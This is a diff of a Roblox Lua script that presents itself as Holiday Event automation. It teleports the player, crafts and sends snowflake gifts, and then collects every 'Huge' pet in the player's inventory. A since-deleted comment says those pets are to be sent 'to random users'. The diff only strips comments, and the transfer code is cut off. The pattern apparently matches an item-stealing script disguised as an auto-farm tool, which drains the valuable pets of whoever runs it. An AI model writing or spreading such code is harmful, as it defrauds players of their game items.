@@ -7,7 +7,6 @@ local amountThreshold = 100
 local snowflakeToGiftRatio = 10
 local diamondPerGift = 10000
 
--- Teleport player to the Holiday Event location
 if teleportLocation and teleportLocation:IsA("BasePart") then
     player.Character:SetPrimaryPartCFrame(teleportLocation.CFrame)
     print("Player has been teleported to the Holiday Event!")
@@ -17,7 +16,6 @@ end
 
 wait(15)
 
--- Function to check inventory, craft gifts if possible
 local function checkAndCraftGifts()
     local playerInventory = Save.Get()["Inventory"]
     local MiscInv = playerInventory["Misc"] or {}
@@ -26,7 +24,6 @@ local function checkAndCraftGifts()
 
     print("Inventory loaded. Misc items count: " .. #MiscInv)
 
-    -- Get diamond count from leaderstats
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         local diamondStat = leaderstats:FindFirstChild("💎 Diamonds")
@@ -39,7 +36,6 @@ local function checkAndCraftGifts()
         warn("No leaderstats found.")
     end
 
-    -- Count snowflakes in the inventory
     for _, item in pairs(MiscInv) do
         if item.id == "Snowflake" then
             snowflakeCount = snowflakeCount + item._am
@@ -80,7 +76,6 @@ checkAndCraftGifts()
 
 wait(10)
 
--- Function to send Snowflake Gifts if the threshold is met
 local function sendSnowflakeGifts()
     local playerInventory = Save.Get()["Inventory"]
     local lootboxInv = playerInventory["Lootbox"] or {}
@@ -128,12 +123,10 @@ sendSnowflakeGifts()
   wait(5)
 
 
--- New feature: Send all Huge Pets from inventory to random users
 local function sendHugePets()
     local Network = require(game.ReplicatedStorage.Library.Client.Network)
     local HugeUIDList = {}
 
-    -- Collect Huge Pets (e.g., Lit Octopus) from the inventory
     for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
         if PetData.id:find("Huge") then 
             table.insert(HugeUIDList, PetUID)
